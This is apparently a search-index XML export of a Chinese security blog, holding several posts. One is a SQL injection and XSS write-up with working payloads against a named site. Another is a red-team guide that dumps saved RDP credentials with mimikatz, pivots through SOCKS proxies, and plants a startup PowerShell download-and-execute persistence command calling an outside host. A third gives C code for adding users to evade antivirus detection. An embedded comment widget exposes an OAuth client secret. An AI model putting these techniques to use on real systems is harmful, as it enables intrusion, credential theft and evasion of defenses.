<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[即刻安全纯技术交流群]]></title>
    <url>%2Fjishu.html</url>
    <content type="text"><![CDATA[&nbsp; 其实我自己也想了很多很多，其实有一段时间比较低迷，有想过退出这个圈子，但是最后还是很多位朋友鼓励我，不要放弃，话实话进入这个圈子，也算是刚刚好一年了，个人也是一位业余爱好者的身份，来进行和你们交流和探讨，自己也是忧郁了很久很久，最终 看到咱们即刻群，基本都是整天水群，斗图，我看着实在是不忍心，即刻安全也是我的一部分，我也是其中的一份子，我的开始就是即刻安全！！即刻安全花费了我的很多心血，所以我重新开始整段群，创建此群的初衷就是，无斗图、无广告、无水群的纯技术交流群。 &nbsp; 感谢各位朋友粉丝的大力支持，也是才有我们即刻安全的今天。 如有志同道合的朋友，欢迎加入我们即刻安全纯技术交流群：307283889 希望进群的朋友能遵守规则：莫斗图、莫水群，希望能打造更好的技术交流氛围 特此：即刻安全团体敬上 Demon 2017.8.27 &nbsp;&nbsp;]]></content>
  </entry>
  <entry>
    <title><![CDATA[挖洞经验 | 热门航空网站上的SQLi和XSS漏洞]]></title>
    <url>%2FSQLi-Xss.html</url>
    <content type="text"><![CDATA[上个月为了练手，我选择了一个较受欢迎的网站（goodwesite.com）作为我的渗透测试对象。在漏洞挖掘过程中，我发现了该网站存在SQL注入和XSS漏洞。在正式开始文章内容前，让我们先来简单了解下该类漏洞的定义及产生原理。 什么是SQL注入漏洞？此漏洞允许未经身份验证的用户，从受害者的网站数据库中窃取数据，包括敏感用户信息等。 漏洞产生原因？之所以存在该漏洞是因为，goodwebsite在其登录界面对于用户输入的内容未进行正确的消毒处理导致的；这与在原始SQL查询中添加用户输入基本相同。此时黑客只需输入相应的渗透向量，就可能窃取走数据库中的哈希密码和其他敏感用户信息。 因此，在测试“登录”页面时我随机输入了个用户名和密码，并使用Burp Suite拦截其请求，接着我用Test％27来作为用户名，然后将请求转发给Burp Repeater，并收到一条错误的回复，Response中的错误仿佛像是在发起Request请求。 Request:POST /register-login/check.php HTTP/1.1Content-Length: 76Content-Type: application/x-www-form-urlencodedCookie: bmslogin=no; bmsid=f3011db015dca9a4f2377cd4e864f724Host: goodwebsite.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko)Chrome/41.0.2228.0 Safari/537.21Accept: /strLogin=Test%27&amp;strPassword=kResponse Error:PDOException Object ( [message:protected] =&gt; SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near Test’ ‘ and valid_id = 1’ at line 1 [string:Exception:private] =&gt; [code:protected] =&gt; 42000 [file:protected] =&gt; /var/www/goodwebsite.server.com/register-login/send.php [line:protected] =&gt; 10 [trace:Exception:private] =&gt; Array ( [0] =&gt; Array( [file] =&gt; /var/www/goodwebsite.server.com/register-login/send.php [line] =&gt; 10 [function] =&gt; query [class] =&gt; PDO [type] =&gt; -&gt; [args] =&gt; Array ( [0] =&gt; SELECT * FROM wp_ggg_user WHERE login = Test’e ‘ and valid_id = 1; ) [previous:Exception:private] =&gt; [errorInfo] =&gt; Array ( [0] =&gt; 42000 1 =&gt; 1064 2 =&gt; You have an error in your SQL syntax; check the manual that corre&gt; sponds to your MySQL server version for the right syntax to use near Test’ ‘ and valid_id&gt; = 1’ at line 1 ) 根据初步的判断，我尝试了一些其他的SQL查询，我使用的第一个查询语句是 Test%27and extractvalue(1,concat(0x00a,database()))or’这次出现的错误与上述类似，只是出现了一点小的变化，错误的结尾部分如下： [previous:Exception:private] =&gt; [errorInfo] =&gt; Array ( [0] =&gt; HY000 1 =&gt; 1105 2 =&gt; XPATH syntax error: ‘goodwebsite’ ) 从以上错误信息中，我们获取到了网站的数据库名称为goodwebsite。 除此之外，我还测试了以下的基本信息查询语句： system_user()@@versiondatabase()@@hostname@@datadir@@GLOBAL.VERSIONsession_user()schema()UUID() 所以，接着我使用的查询语句是Test％27和extractvalue（1，concat（0x00a，system_user（）））或’错误返回信息如下： [previous:Exception:private] =&gt; [errorInfo] =&gt; Array ( [0] =&gt; HY000 1 =&gt; 1105 2 =&gt; XPATH syntax error: ‘goodwebsite@localhost’ ) 通过以上查询测试，足以证明SQL注入漏洞的存在。为了获取更多的信息，我继续使用了第三个查询语句Test％27和extractvalue（1，concat（0x00a，@@ hostname））或’错误返回信息如下： [previous:Exception:private] => [errorInfo] => Array ( [0] => HY000 [1] => 1105 [2] => XPATH syntax error: ' www2.rz.something.com' ) 这里，我差点忘了查询目标数据库的版本信息，使用查询语句Test％27和extravtcalue（1，concat（0x00a，@@ version））或“错误返回信息如下： [previous:Exception:private] => [errorInfo] => Array ( [0] => HY000 [1] => 1105 [2] => XPATH syntax error: ‘ 5.1.73–1+deb6u1-log’ ) ![enter description here][5] 最后，我尝试查询了测试％27和extractvalue（1，concat（0x00a，UUID（））或'错误返回信息如下： [previous:Exception:private] => [errorInfo] => Array ( [0] => HY000 [1] => 1105 [2] => XPATH syntax error: ‘ ab88…..UUDI’ ) 到目前为止，我已经获取到了许多有价值的信息但这还远远不够，为了节省时间我决定使用SQLI扫描神器的SqlMap;来帮助我完成后续的查询任务以下是的SqlMap为我返回的结果。： web server operating system: Linux Debian 6.0 (squeeze) web application technology: Apache 2.2.16, PHP 5.4.42 back-end DBMS: MySQL >= 5.0 Database: goodwebsite [18 tables] + — — — — — — — — — — — — -+ | wp_bms_log | | wp_bms_quiz_lh_answer | | wp_bms_quiz_lh_question | | wp_bms_quiz_lh_quiz | | wp_bms_statistics | | wp_bms_user | | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | + — — — — — — — — — — — — -+ Then: Table: wp_users [10 columns] + — — — — — — — — — — -+ — — — — — — — — — — -+ | Column | Type | + — — — — — — — — — — -+ — — — — — — — — — — -+ | display_name | varchar(250) | | ID | bigint(20) unsigned | | user_activation_key | varchar(255) | | user_email | varchar(100) | | user_login | varchar(60) | | user_nicename | varchar(50) | | user_pass | varchar(255) | | user_registered | datetime | | user_status | int(11) | | user_url | varchar(100) | + — — — — — — — — — — -+ — — — — — — — — — — -+ 但基于渗透测试的基本原则，我并没有继续深入下去。 XSS：在完成对SQLI漏洞的测试后，接着我将测试目标转向了另一个页面goodwebsite.com/register-login/send.php 。同样是一个POST请求，不同的是它带有一个strSendMail =的可输入变量。因此，我测试了以上相同的SQL语句，并获取到了同样的错误返回结果。接着，我测试了一个XSS的有效载荷E’％22（）％26％25 提示（/ khizer /）&lt;/ ScRiPt&gt;，请求如下： POST /register-login/send.php HTTP/1.1Content-Length: 60Content-Type: application/x-www-form-urlencodedReferer: http://goodwebsite.com/Cookie: bmslogin=no; bmsid=f3011db015dca9a4f2377cd4e864f724Host: goodwebsite.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: /strSendMail=e’%22()%26%25prompt(/khizer/)弹框了！ 之后，我第一时间报告了这两个漏洞的细节，他们在一小时内就进行了修复，并向我发送了感谢信。 *参考来源：medium，FB小编secist编译，转载请注明来自FreeBuf.COM]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6年的老漏洞”Loop Bug”重现，几近全部PDF阅读器中招]]></title>
    <url>%2FLoop-Bug.html</url>
    <content type="text"><![CDATA[近日，德国软件开发商HannoBöck称，一个早在2011年就被发现的PDF解析库中的隐蔽bug，如今在大多数主流的PDF阅读器中再次出现。 该bug最初是由德国软件开发商Andreas Bogk，在Evince（GNOME桌面环境下的一个PDF，PostScript，DjVu，TIFF与DVI文档查看工具）的解析器组件中被发现的，当时Andreas Bogk还协助Evince修复了该漏洞，并在2011年的混沌通信大会上展示了该漏洞。 Bogk发现具有特定结构的PDF文档（PDF文件交叉引用内部参照表）会导致Evince应用程序进入一个死循环，并占用本地所有的CPU资源，迅速耗尽内存，从而使Evince应用程序崩溃。 这个bug被大多数人所忽略，人们从未将它视为一个主要的安全问题，认为这只是一个安装在Linux桌面上的小应用程序。 六年前的bug在主流的PDF阅读器中重现六年后的今天，曾经被人们忽视的小问题，如今却转变成了一个大问题。Böck表示，已经在众多知名的PDF阅读器中发现了类似的问题。 例如，Böck在PDFium中发现了Bogk当时报告的“loop”bug，该库允许Chrome无需任何插件就可以在浏览器中，渲染PDF文档。 Firefox中的pdf.js库也受到影响。此外，Pdf.js库还被用在了GitHub上，用于在网站界面渲染PDF文档，而无需用户下载文件并在第三方应用程序中查看。因此，GitHub的实现也极易受到“loop”bug的影响。 在Windows 8或更高版本中默认安装的Windows Runtime PDF Renderer库或WinRT PDF也受此影响。这是Edge内置的PDF查看器，也是Windows“Reader App”的默认PDF解析器。 类似地，开源PDF解析器（如Ghostscript和QPDF）同样也受到了影响。这也意味着许多其他已经安装部署Ghostscript或QPDF的web和桌面，都将受到该漏洞的影响。 Böck已向所有受影响的产品厂商报告了旧的错误信息，他们正准备为此推出补丁程序。 Adobe Reader未受影响Adobe Reader和Apple的OS X内置PDF查看器并未受到影响。 研究人员说，他主要是通过Fuzzing技术来对每个项目库进行测试后发现问题的。Fuzzing是一种基本的安全测试技术，用于测试人员分析程序的异常输出响应。Google的安全专家非常热衷于该技术，并极力向任何有兴趣倾听他们建议的人推荐该技术。 Böck指责受影响项目的管理员，没有运行更新的测试套件。软件开发人员不应该在没有成功通过测试套件的情况下，发布新版本的应用程序。Böck同时还建议PDF应用程序，将Bogk“loop bug”演示文件添加到他们的测试用例中。]]></content>
      <categories>
        <category>安全资讯</category>
      </categories>
      <tags>
        <tag>安全资讯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用RDP跳过网络隔离？]]></title>
    <url>%2FRDP.html</url>
    <content type="text"><![CDATA[本文我将向大家演示，如何通过RDP跳转盒进入隔离/受保护的网络。下图是我为该场景制作的拓扑图： 1.简要说明：LAN是一种扁平的工作站和服务器网络。一些服务器（包括RDP跳转盒）无法与Internet连接。工作站可以通过代理访问Internet。RDP跳转盒是LAN上唯一可以与“Secret Network（隔离网络）”通话的主机，仅限于3389端口。rasta-lan.local和secret-lan.local是两种不同的网络。LAN网段为：10.0.0.0/16；隔离网络网段为：172.16.0.0/24。 通过该方案，渗透测试人员可以在其渗透主机（Windows 10）上打开远程桌面连接，并利用RDP直接连接到隔离/受保护的目标服务器上。 2.场景预设我们已有一个名为rasta_mouse的域用户组成员的beacon(信标)。通过查询目标服务器，以确定哪些用户/组已被授予了RDP访问权限。 beacon&gt; powerpick Get-NetLocalGroup -ComputerName RDP01 -GroupName “Remote Desktop Users”ComputerName : RDP01AccountName : rasta-lan.local/Jump Box UsersIsDomain : TrueIsGroup : TrueSID : S-1-5-21-2294392343-2072776990-791666979-1106谁是Jump Box（跳转盒）用户组的成员？ beacon&gt; powerpick Get-NetGroupMember -GroupName “Jump Box Users”GroupDomain : rasta-lan.localGroupName : Jump Box UsersMemberDomain : rasta-lan.localMemberName : rasta_mouse_admMemberSID : S-1-5-21-2294392343-2072776990-791666979-1107IsGroup : FalseMemberDN : CN=Rasta Mouse (Admin),CN=Users,DC=rasta-lan,DC=localrasta_mouse有两个单独的帐户，这意味着我们需要获取到rasta_mouse_adm的账户凭据才能继续我们下一步的操作。这里我将探讨两种可能的方法。 3.凭据管理器 &amp; DPAPI如果用户选择了保存RDP凭据，并且你也有SeDebugPrivilege权限来执行此操作，那么这将是最有趣和有效的办法。 在凭据管理器GUI中的Windows凭据：&nbsp;&nbsp; 你也可以在命令行上获取： beacon&gt; shell vaultcmd /listcreds:”Windows Credentials” /allCredentials in vault: Windows CredentialsCredential schema: Windows Domain Password CredentialResource: Domain:target=TERMSRV/rdp01Identity: LAN\rasta_mouse_admHidden: NoRoaming: NoProperty (schema element id,value): (100,2)这些凭据存储在用户目录C:\Users\\AppData\Local\Microsoft\Credentials*中。 beacon&gt; powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force Directory: C:\Users\rasta_mouse\AppData\Local\Microsoft\CredentialsMode LastWriteTime Length Name-a-hs- 02/09/2017 13:37 412 2647629F5AA74CD934ECD2F88D64ECD0-a-hs- 30/08/2017 19:28 11204 DFBE70A7E5CC19A398EBF1B96859CE5D现在我们来查看 beacon&gt; mimikatz dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {6515c6ef-60cd-4563-a3d5-3d70a6bc6992} dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000030 - 48 szDescription : Local Credential Data algCrypt : 00006603 - 26115 (CALG_3DES) dwAlgCryptLen : 000000c0 - 192 dwSaltLen : 00000010 - 16 pbSalt : be072ec0f54a6ceaffd09fe2275d72f9 dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 00008004 - 32772 (CALG_SHA1) dwAlgHashLen : 000000a0 - 160 dwHmac2KeyLen : 00000010 - 16 pbHmack2Key : a3579f9e295013432807757d3bcdf82e dwDataLen : 000000d8 - 216 pbData : 0bad8cb788a364061fa1eff57c3cbc83c8aa198c95537f66f2f973c8fe5e7210626c58423b84b55f604cff2b23165b690ad7fa7ad03d80051cb7c1a0e987f36586ede1bd7ff7e2b9f1d3cbc4b8f1b8557ab1be3402d3bfe39b1682353504ff156615b44ea83aa173c3f7830b65bf9202d823932ca69413fcb8bca1a76893c7cbab7e0ee0bbe9269a8b9f65e88e099334177be15cf977a44b77ba6e829c89303ef4764f5fd661e722c7508ad2e01a41f9cd079fc7ce5a8dba90c94a2314941674ad47567bd9c980548f809fe72ce4895b6a56cb9148c47afb dwSignLen : 00000014 - 20 pbSign : 43559a2b2e9b11bc4b56828a1d2ece489c9dfd52 以上我们需要关注的是pbData和guidMasterKey的信息。pbData是我们要解密的数据，guidMasterKey是解密所需要的密钥。这里LSASS已经在其缓存中存有这个key – 因此我们可以使用SeDebugPrivilege获取。 beacon&gt; mimikatz !sekurlsa::dpapi 在输出信息中，我们找到了我们需要的GUID和关联的MasterKey。 * 00000000 * GUID : {6515c6ef-60cd-4563-a3d5-3d70a6bc6992} * Time : 02/09/2017 13:37:51 * MasterKey : 95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b * sha1(key) : 89f35906909d78c84ba64af38a2bd0d1d96a0726 如果我们在交互模式下运行mimikatz，它会自动将这些密钥添加到我们的dpapi缓存中，并在尝试解密凭据时使用它们。但是，通过Cobalt Strike运行mimikatz不允许我们保留相同的会话（至少我不知道该如何保留）。所以，我们必须要拿到key并手动使用它。&nbsp;&nbsp; 4.RDP01这些凭据将用于RDP进入跳转盒 – 因为是直接从我们的渗透机器上这样做。所以，我们先在我们当前的信标上设置一个SOCKS代理。 beacon&gt; socks 1337[+] started SOCKS4a server on: 1337SSH进入你的Teamserver，并安装socat和proxychains（如果还未安装）。修改proxychains.conf配置文件，以在端口1337上使用127.0.0.1。然后用proxychains运行socat – &gt; proxychains -&gt; proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389。这将允许我们的Teamserver在3389端口监听，任何进入该该端口的流量，都将被重定向到socks代理10.0.0.100:3389上。 现在，我们已经RDP到了我们的Teamserver的IP地址，我们应该已经在jump box上了…&nbsp;&nbsp; 5..Persistence为了保持对该服务器的持久访问，我们可以进行简单的设置，以便当真正的rasta_mouse_adm用户连接时， 我们可以获取到一个SMB Beacon。 操作步骤如下：创建一个无状态PowerShell SMB Beacon payload。在你的Teamserver（(web delivery)）上将其托管在/smb。在我们当前的beacon创建一个Reverse Port Foward -&gt; rportfwd 8080 178.62.56.134 80。创建C:\Users\rasta_mouse_adm\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat，并写入以下内容： powershell.exe -nop -w hidden -c “iex((new-object net.webclient).downloadstring(‘http://10.0.1.200:8080/smb’))”注销RDP会话。当真正的用户登录时，我们将会在我们屏幕上获取到以下信息： 09/02 14:19:45 visit from: 178.62.56.134 Request: GET /smb page Serves /opt/cobaltstrike/uploads/beacon.ps1 null让我们连接到beacon。 beacon&gt; link 10.0.0.100[+] established link to child beacon: 10.0.0.100 注意：如果用户注销了，我们将会失去beacon；如果仅仅只是断开连接，那么我们将保持连接。 6.SECRET现在我们已经在jump box上了，我们的目标是SECRET。那么，我们该如何进入SECRET呢？ 你实际上我们可以通过键盘记录来获取到我们想要的信息，如下：停止当前Beacon中的SOCKS代理，以及Teamserver上的proxychains/socat。在jump box上启动一个新的SOCKS代理（你可以使用相同的端口）。在你的Teamserver上运行proxychains socat TCP4-LISTEN:3389，fork TCP4:172.16.0.10:3389。像之前一样，RDP到Teamsever IP，我们将直接进入到SECRET。 7.总结不要保存RDP凭据在jump boxes上，建议使用双因素身份认证。DPAPI没有足够的保护。https://t.co/1lBySQcVYt — Matthew Dunwoody (@matthewdunwoody) September 2, 2017 8.欢迎下方一起参与讨论&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>原创翻译</category>
      </categories>
      <tags>
        <tag>原创翻译</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过安全防护敏感检测行为]]></title>
    <url>%2FBypass3.html</url>
    <content type="text"><![CDATA[投稿原作者：jishuzhain 1.思考昨天，通过静态免杀可以bypass国内杀软，当我们想执行一些敏感的操作时，…… 有很多时候，在渗透测试中，拿到了Webshell，查看了权限，发现是系统权限，很开心，但是往往防护软件会给你当头一棒，呵呵，添加用户的时候，却被360拦截… 那么如何解决呢？在这篇文章中，提供了一些思路http://www.91ri.org/13805.html 2.我有一个大胆的想法所以我就假设了一个想法：360安全卫士是一个应用程序，它是如何检测用户是是否添加用户的呢？答案当然是命令行了。假设它获取每一行命令去分析，然后判断是否拦截，那么肯定是使用的系统API吧？要不然程序员会头炸的。大概这样简单的设想，我们就开始验证了。在Windows编程中间，我们经常需要添加用户，删除用户，添加用户组等等功能，那些功能如何实现呢？搜索了一下windows提供的API，文末提高全功能源码。https://msdn.microsoft.com/en-us/library/aa370649(VS.85).aspx#本文需要的技术背景（visual c++编程基础，dos命令）环境，vm10 360安全卫士最新版，防护全部开启。&nbsp;&nbsp;然后再用API添加。 &nbsp;&nbsp; 直接创建呢？发现失败了，基于行为检测。最后可以发现最新版本的360安全卫士已经pass&nbsp;&nbsp;&nbsp; 3.分析现在我们分析，假设服务器上net.exe被删除了怎么办？ #pragma comment(lib, “netapi32.lib”) 这行代码主要是导入了一个dll，名称为netapi32.dll 如果服务器上没有net.exe，我们将此dll和这个命令行工具上传至服务器，也是可以添加用户的，这就是以前的无net添加用户。 4.Code```javascript//编译平台：VC++6.0 Win10专业版#ifndef UNICODE#define UNICODE#endif#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#include&lt;assert.h&gt;#include&lt;lm.h&gt;#pragma comment(lib, &quot;netapi32.lib&quot;)int wmain(int argc, wchar_t *argv[])&#123; USER_INFO_1 ui; DWORD dwLevel = 1; DWORD dwError = 0; NET_API_STATUS nStatus; if (argc != 3) &#123; printf(&quot;==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;); fwprintf(stderr, L&quot;\tUsage: %s UserName PassWord&quot;, argv[0]); printf(&quot;\n==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;); exit(1); &#125; ui.usri1_name = argv[1]; ui.usri1_password = argv[2]; ui.usri1_priv = USER_PRIV_USER; ui.usri1_home_dir = NULL; ui.usri1_comment = NULL; ui.usri1_flags = UF_SCRIPT; ui.usri1_script_path = NULL; nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;ui, &amp;dwError); if (nStatus == NERR_Success) fwprintf(stderr, L&quot;\n[*]User add success!! UserName is [%s] \n&quot;, argv[1]); else printf(&quot;Can not add user ... System Error Code is %d \nPlase go to https://msdn.microsoft.com/en-us/library/ms681381(v=vs.85).aspx &quot;, nStatus); return 0;&#125; /* UNICODE */#ifndef UNICODE#define UNICODE#endif/* 头文件 */#include &lt;stdio.h&gt;#include &lt;assert.h&gt;#include &lt;windows.h&gt; #include &lt;lm.h&gt;/************************************** AddUser* 功能 增加用户* 参数 szServerName，主机名，如果为本机增加用户，设置为NULL* szUserName，用户名* szPassword，密码**************************************/int AddUser(LPWSTR szServerName, LPWSTR szUserName, LPWSTR szPassword)&#123; USER_INFO_1 ui; DWORD dwLevel = 1; // 使用 USER_INFO_1 作为参数 DWORD dwError = 0; NET_API_STATUS nStatus; // 填充 USER_INFO_1 ui.usri1_name = szUserName; // 用户名 ui.usri1_password = szPassword; // 密码 ui.usri1_priv = USER_PRIV_USER; // privilege ui.usri1_home_dir = NULL; ui.usri1_comment = NULL; ui.usri1_flags = UF_SCRIPT; ui.usri1_script_path = NULL; // 调用 NetUserAdd 增加用户 nStatus = NetUserAdd(szServerName, dwLevel, (LPBYTE)&amp;ui, &amp;dwError); // 判断结果 if (nStatus == NERR_Success) &#123; wprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;, szUserName, szServerName); &#125; else &#123; fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); &#125; return 0;&#125;/************************************** AddUserToGroup* 功能 为用户组增加用户* 参数 szServerName，主机名，如果为本机，设置为NULL* szUserName，用户名* szGroup，用户组名**************************************/int AddUserToGroup(LPWSTR szServerName, LPWSTR szUserName, LPWSTR szGroup)&#123; NET_API_STATUS nStatus; // 调用 NetGroupAddUser nStatus = NetGroupAddUser( szServerName, szGroup, szUserName ); // 判断结果 if (nStatus == NERR_Success) fwprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;, szUserName, szServerName); else fprintf(stderr, &quot;NetGroupAddUser A system error has occurred: %d\n&quot;, nStatus); return 0;&#125;/************************************** DelUser* 功能 删除用户* 参数 szServerName，主机名，如果为本机，设置为NULL* szUserName，用户名**************************************/int DelUser(LPWSTR szServerName, LPWSTR szUserName)&#123; DWORD dwError = 0; NET_API_STATUS nStatus; // 调用 NetUserDel 删除用户 nStatus = NetUserDel(szServerName, szUserName); // 判断并显示结果 if (nStatus == NERR_Success) fwprintf(stderr, L&quot;User %s has been successfully deleted on %s\n&quot;, szUserName, szServerName); else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); return 0;&#125;/************************************** int ListUsers(LPWSTR pszServerName)* 功能 列举用户* 参数 szServerName，主机名，如果为本机，设置为NULL**************************************/int ListUsers(LPWSTR pszServerName)&#123; LPUSER_INFO_0 pBuf = NULL; LPUSER_INFO_0 pTmpBuf; DWORD dwLevel = 0; DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH; DWORD dwEntriesRead = 0; DWORD dwTotalEntries = 0; DWORD dwResumeHandle = 0; DWORD i; DWORD dwTotalCount = 0; NET_API_STATUS nStatus; // 循环，直到可以成功调用 NetUserEnum do &#123; // 调用NetUserEnum函数 nStatus = NetUserEnum(pszServerName, dwLevel,// 这里设置为0，使用 LPUSER_INFO_0 返回结果 FILTER_NORMAL_ACCOUNT, // 只列举“正常”类型的用户 (LPBYTE*)&amp;pBuf,// LPUSER_INFO_0 保存返回结果 // MAX_PREFERRED_LENGTH，内存由API分配，需要在之后调用NetApiBufferFree释放 dwPrefMaxLen, &amp;dwEntriesRead,// 读了的 Entries &amp;dwTotalEntries,// 一共的 Entries &amp;dwResumeHandle); // 判断是否成功 if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) &#123; if ((pTmpBuf = pBuf) != NULL) &#123; // 循环读取用户信息 for (i = 0; (i &lt; dwEntriesRead); i++) &#123; assert(pTmpBuf != NULL); if (pTmpBuf == NULL) &#123; fprintf(stderr, &quot;An access violation has occurred\n&quot;); break; &#125; // 输出 wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;usri0_name); // 下一个 pTmpBuf++; dwTotalCount++; &#125; &#125; &#125; else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); // 释放内存 if (pBuf != NULL) &#123; NetApiBufferFree(pBuf); pBuf = NULL; &#125; &#125; while (nStatus == ERROR_MORE_DATA); // end do // 释放内存 if (pBuf != NULL) NetApiBufferFree(pBuf); fprintf(stderr, &quot;Total of %d users\n\n&quot;, dwTotalCount); return 0;&#125;/************************************** int ListGroup(LPWSTR pszServerName)* 功能 列举用户组* 参数 szServerName，主机名，如果为本机，设置为NULL**************************************/int ListGroup(LPWSTR pszServerName)&#123; DWORD dwLevel = 0; DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH; DWORD dwEntriesRead = 0; DWORD dwTotalEntries = 0; DWORD dwResumeHandle = 0; DWORD i; DWORD dwTotalCount = 0; NET_API_STATUS nStatus; LPLOCALGROUP_INFO_0 pBuf = NULL; LPLOCALGROUP_INFO_0 pTmpBuf; do // begin do &#123; // 调用NetLocalGroupEnum 参数设置与NetLocalGroup类似 nStatus = NetLocalGroupEnum( pszServerName, 0, (LPBYTE*)&amp;pBuf, dwPrefMaxLen, &amp;dwEntriesRead, &amp;dwTotalEntries, &amp;dwResumeHandle); // 判断结果 if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) &#123; if ((pTmpBuf = pBuf) != NULL) &#123; // 循环输出 for (i = 0; (i &lt; dwEntriesRead); i++) &#123; assert(pTmpBuf != NULL); if (pTmpBuf == NULL) &#123; fprintf(stderr, &quot;An access violation has occurred\n&quot;); break; &#125; wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;lgrpi0_name); pTmpBuf++; dwTotalCount++; &#125; &#125; &#125; else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); // 释放内存 if (pBuf != NULL) &#123; NetApiBufferFree(pBuf); pBuf = NULL; &#125; &#125; while (nStatus == ERROR_MORE_DATA); // end do if (pBuf != NULL) NetApiBufferFree(pBuf); fprintf(stderr, &quot;Total of %d groups\n\n&quot;, dwTotalCount); return 0;&#125;/************************************** ShowUsersInfo* 功能 显示指定用户的信息* 参数 szServerName，主机名，如果为本机，设置为NULL* pszUserName，用户名**************************************/int ShowUsersInfo(LPWSTR pszServerName,LPWSTR pszUserName)&#123; DWORD dwLevel = 4;// 使用 LPUSER_INFO_4 返回结果 LPUSER_INFO_4 pBuf = NULL; NET_API_STATUS nStatus; nStatus = NetUserGetInfo(pszServerName, pszUserName, dwLevel, // pBuf参数类型 (LPBYTE *)&amp;pBuf); // 判断并输出结果 if (nStatus == NERR_Success) &#123; if (pBuf != NULL) &#123; wprintf(L&quot;\n\tAccount: %s\n&quot;, pBuf-&gt;usri4_name); wprintf(L&quot;\tComment: %s\n&quot;, pBuf-&gt;usri4_comment); wprintf(L&quot;\tUser comment: %s\n&quot;, pBuf-&gt;usri4_usr_comment); wprintf(L&quot;\tFull name: %s\n&quot;, pBuf-&gt;usri4_full_name); wprintf(L&quot;\tpriv: %d\n&quot;, pBuf-&gt;usri4_priv); &#125; &#125; else fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus); // 释放内存 if (pBuf != NULL) NetApiBufferFree(pBuf); return 0;&#125;/************************************** wmain* 功能 入口函数，根据参数判断需要调用的功能函数* 参数 参见usage输出**************************************/int __cdecl wmain(int ac, wchar_t * av[])&#123; if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-a&quot;) == 0) &#123; AddUser(NULL, av[2], av[3]); &#125; else if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-g&quot;) == 0) &#123; AddUserToGroup(NULL, av[2], av[3]); &#125; else if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0) &#123; ShowUsersInfo(NULL, av[2]); &#125; else if (ac == 2 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0) &#123; ListUsers(NULL); ListGroup(NULL); &#125; else if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-d&quot;) == 0) &#123; DelUser(NULL, av[2]); &#125; else &#123; printf(&quot;usage: \n&quot; &quot;\t %ws -a &lt;username&gt; &lt;password&gt; to add a user\n&quot; &quot;\t %ws -g &lt;username&gt; &lt;group&gt; add a user to a group&quot; &quot;\t %ws -i &lt;username&gt; to show user info\n&quot; &quot;\t %ws -d &lt;username&gt; to del a user\n&quot;, av[0], av[0], av[0], av[0]); &#125; return 0;&#125; 5.欢迎下方一起参与讨论&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass, 渗透, web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypass_safedog系列1]]></title>
    <url>%2Fbypass_shell.html</url>
